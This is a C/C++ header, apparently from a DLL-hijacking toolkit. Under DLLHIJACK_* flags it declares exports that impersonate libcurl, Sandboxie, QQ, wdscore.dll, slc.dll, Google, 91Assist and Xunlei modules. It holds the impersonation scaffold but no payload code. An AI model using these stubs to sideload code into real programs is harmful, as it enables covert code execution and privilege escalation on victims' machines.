
//http://www.dependencywalker.com/ dependency下载地址

// 如果显式地把类成员函数声明为使用__cdecl或者__stdcall，那么，
//将采用__cdecl或者__stdcall的规则来压栈和出栈，而this指针将作为函数的第一个参数最后压入堆栈，而不是使用ECX寄存器来传递了。

#ifdef _WINDLL

//dsktptst.dll
extern "C" __declspec(dllexport) void* __stdcall SetCommandLine(void* Src);

extern "C" __declspec(dllexport) int __stdcall ShowMessage(int a1);



#ifdef DLLHIJACK_LIBCURL
extern "C" __declspec(dllexport) int __cdecl curl_easy_cleanup(int a1);
extern "C" __declspec(dllexport) int __cdecl curl_easy_init();
extern "C" __declspec(dllexport) int __cdecl curl_easy_perform(int a1);
extern "C" __declspec(dllexport) signed int __cdecl curl_easy_setopt(int a1, int a2, char a3);
#endif


#ifdef DLLHIJACK_SBIEDLL
extern "C" __declspec(dllexport) signed int SbieApi_Log();
extern "C" __declspec(dllexport) void __stdcall  SbieDll_Hook(int a1, int a2, int a3);
#endif


#ifdef DLLHIJACK_CLOVER
extern "C" __declspec(dllexport) DWORD /*__stdcall*/ CloverMain();
#endif

#ifdef DLLHIJACK_QQMGRDIARY
extern "C" __declspec(dllexport) DWORD __cdecl DestroyQMNetworkMgr();
extern "C" __declspec(dllexport) void __cdecl CreateQMNetworkMgr(DWORD a1);
#endif


#ifdef DLLHIJACK_GETCURRENTROLLBACK
extern "C" __declspec(dllexport) void  GetCurrentInternal_ReportRollbackEvent();
//extern "C" __declspec(dllexport) int SetClientVerdict();
#endif

//msoobe wdscore.dll
#ifdef DLLHIJACK_MSOOBE
extern "C" __declspec(dllexport) VOID * CurrentIP();
extern "C" __declspec(dllexport) DWORD ConstructPartialMsgVA(DWORD a1, char* a2);
extern "C" __declspec(dllexport) char* ConstructPartialMsgVW(DWORD a1, DWORD a2);
extern "C" __declspec(dllexport) DWORD WdsSetupLogDestroy();
extern "C" __declspec(dllexport) char* WdsSetupLogInit(DWORD a1, DWORD a2, wchar_t* a3);
extern "C" __declspec(dllexport) DWORD WdsSetupLogMessageA();
extern "C" __declspec(dllexport) DWORD WdsSetupLogMessageW();
#endif



#ifdef DLLHIJACK_GOOGLESERVICE
extern "C" __declspec(dllexport) int  GoogleServices_1(int a1, int a2, int a3, int a4);
#endif

#ifdef DLLHIJACK_91ASSISTUPDATE
extern "C" __declspec(dllexport) int __cdecl CreateTask(LPCWSTR lpszUrl, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
extern "C" __declspec(dllexport) char __cdecl GetLocalFileName(int a1, int a2);
extern "C" __declspec(dllexport) 	char __cdecl StartDownload(int a1);
extern "C" __declspec(dllexport) 	void __cdecl initDll(void* a1, int a2, void* a3, void* a4, int a5);
#endif

//rekeywiz.exe //slc.dll
#ifdef DLLHIJACK_REKEYWIZ
extern "C" __declspec(dllexport) DWORD __cdecl SLGetWindowsInformationDWORD(short* pwstr, DWORD a1);
#endif


//extern "C" __declspec(dllexport) int  _CorExeMain_Exported();
#ifdef DLLHIJACK_XBROWSER
extern "C" __declspec(dllexport) int __stdcall XL_EnableReportAutoRestartApp(int a1, int a2);
extern "C" __declspec(dllexport) int __stdcall XL_InitBugHandler(int a1, int a2, int a3, int a4, int a5);
extern "C" __declspec(dllexport) int __stdcall XL_SetAlwaysSendReport(int a1);
extern "C" __declspec(dllexport) int __stdcall XL_SetBugReportRootDir(wchar_t* a1);
extern "C" __declspec(dllexport) int __stdcall XL_SetReportShowMode(int a1);
#endif


#ifdef HOOK_ORG_DLL_QQ
#endif

#endif